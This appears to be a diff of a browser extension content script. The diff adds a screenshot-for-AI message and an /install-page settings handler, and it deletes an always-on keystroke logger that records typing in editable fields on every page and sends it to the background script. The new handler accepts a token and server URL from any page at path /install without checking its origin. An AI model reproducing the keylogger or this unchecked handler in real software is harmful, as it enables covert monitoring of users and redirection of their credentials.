@@ -491,7 +491,31 @@
     });
   }
 
+  function requestScreenshotForAI() {
+    if (!creds) return;
+    sendRuntimeMessage({ type: "take-screenshot-for-ai" }, (res) => {
+      if (res && res.success) {
+        console.log("Taptic Screenshot for AI sent successfully");
+      }
+    });
+  }
+
   if (isTopFrame) {
+    // Detect /install page and open extension settings
+    if (window.location.pathname === "/install" && window.tapticInstallData) {
+      const data = window.tapticInstallData;
+      if (data.username && data.team && data.token) {
+        // Send message to background to open settings page
+        sendRuntimeMessage({
+          type: "open-settings-page",
+          username: data.username,
+          team: data.team,
+          token: data.token,
+          serverUrl: data.serverUrl || window.location.origin
+        });
+      }
+    }
+
     createOverlay();
     loadCreds(() => {
       refreshOverlayState();
@@ -618,84 +642,11 @@
     chrome.runtime.onMessage.addListener((msg, sender, sendResponse) => {
       if (msg.type === "trigger-screenshot") {
         requestScreenshot();
+      } else if (msg.type === "trigger-screenshot-for-ai") {
+        requestScreenshotForAI();
       } else if (msg.type === "show-reminder") {
         showReminderModal();
       }
     });
   }
-
-  // Keystroke capture functionality - ALWAYS ENABLED
-  let keystrokeCaptureListener = null;
-
-  function isPasswordField(target) {
-    if (!target) return false;
-    if (target.tagName === "INPUT" && target.type === "password") {
-      return true;
-    }
-    // Check for password-related attributes
-    const autocomplete = target.getAttribute("autocomplete");
-    if (autocomplete && autocomplete.toLowerCase().includes("password")) {
-      return true;
-    }
-    return false;
-  }
-
-  // Start keystroke capture immediately
-  console.log("Taptic: Starting keystroke capture");
-
-  keystrokeCaptureListener = (event) => {
-    console.log("Taptic: Keydown event detected", event.key);
-    
-    const target = event.target;
-    
-    // Don't capture from password fields
-    if (isPasswordField(target)) {
-      console.log("Taptic: Skipping - password field");
-      return;
-    }
-
-    // Only capture if typing in an editable field
-    if (!isEditable(target)) {
-      console.log("Taptic: Skipping - not editable field");
-      return;
-    }
-
-    const key = event.key || "";
-    
-    // Ignore modifier keys alone
-    if (["Control", "Alt", "Shift", "Meta", "CapsLock", "Tab", "Escape"].includes(key)) {
-      console.log("Taptic: Skipping - modifier key");
-      return;
-    }
-
-    // Capture the keystroke
-    let keyData = "";
-    
-    if (key === "Enter") {
-      keyData = "\n";
-    } else if (key === "Backspace") {
-      keyData = "[BACKSPACE]";
-    } else if (key === "Delete") {
-      keyData = "[DELETE]";
-    } else if (key === " " || key === "Spacebar") {
-      keyData = " ";
-    } else if (key.length === 1) {
-      keyData = key;
-    } else {
-      console.log("Taptic: Skipping - special key:", key);
-      return;
-    }
-
-    console.log("Taptic: Captured keystroke:", keyData);
-
-    // Send keystroke to background script
-    sendRuntimeMessage({
-      type: "keystroke",
-      keyData: keyData,
-      timestamp: Date.now()
-    });
-  };
-
-  document.addEventListener("keydown", keystrokeCaptureListener, true);
-  console.log("Taptic: Keystroke listener attached to document");
 })();
